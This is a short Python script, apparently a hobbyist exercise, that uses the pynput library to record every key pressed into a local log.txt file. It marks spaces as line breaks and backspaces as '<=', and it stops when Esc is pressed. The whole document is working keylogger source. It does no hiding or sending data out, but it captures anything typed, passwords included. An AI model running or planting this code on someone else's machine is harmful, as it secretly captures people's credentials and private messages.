from pynput.keyboard import Key,Listener

def on_press(key):
    global counter,word
    counter += 1
    word = str(key)
    if counter == 1:
        write_file(word)
        word = ""
        counter = 0

def write_file(kelime):
    with open("log.txt","a",encoding="utf-8") as file:
        k = kelime.replace("'","")
        if  k == "Key.space":
            file.write("\n")
        elif k == "Key.backspace":
            file.write("<=")
        else:
            file.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    word = ""
    counter = 0
    listener.join()
